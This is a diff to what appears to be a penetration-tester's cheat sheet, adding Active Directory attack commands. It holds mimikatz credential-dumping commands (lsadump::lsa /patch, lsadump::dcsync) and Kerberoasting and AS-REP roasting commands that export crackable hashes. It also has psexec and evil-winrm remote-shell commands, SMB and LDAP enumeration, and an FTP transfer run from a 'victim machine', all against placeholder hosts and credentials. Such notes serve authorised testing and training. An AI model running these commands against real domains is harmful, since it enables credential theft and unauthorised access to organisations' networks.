@@ -179,12 +179,15 @@ On victim machine shell:
 	
 	ftp -v -n -s:ftp.txt
 	
-<b>AD Time</b>
+#AD Time
 
 If you have a high priv user account use mimikatz:
 
 <b>FIRST CHECK FOR USERS</b>
-	net users /domain
+
+	`net users /domain'
+	
+	
 
 	`privilege::debug`
 
@@ -199,6 +202,28 @@ If you have a high priv user account use mimikatz:
 	`lsadump::lsa /patch`
 
 	`lsadump::dcsync /user:xxx`
+	
+#WADComs (https://wadcoms.github.io/)
+
+<b>Top things to check</b>
+
+	python3 GetUserSPNs.py test.local/john:password123 -dc-ip 10.10.10.1 -request
+	
+	python3 psexec.py test.local/john:password123@10.10.10.1
+	
+	python3 GetADUsers.py -all test.local/john:password123 -dc-ip 10.10.10.1
+	
+	python3 GetNPUsers.py test.local/ -dc-ip 10.10.10.1 -usersfile usernames.txt -format hashcat -outputfile hashes.txt
+	
+	<b>evil-winrm -i 10.10.10.1 -c pub.pem -k priv.pem -S -r EVILCORP</b>
+	
+	enum4linux -a 10.10.10.1
+	
+	smbclient -L \\test.local -I 10.10.10.1 -N
+	
+	python3 windapsearch --dc-ip 10.10.10.1 -u test.local\\john -p password123 -U -G --da -m "Remote Desktop Users" -C -r
+	
+	
 	
 	
 <b>Powershell</b> (In Windows 7, 2008 and above)
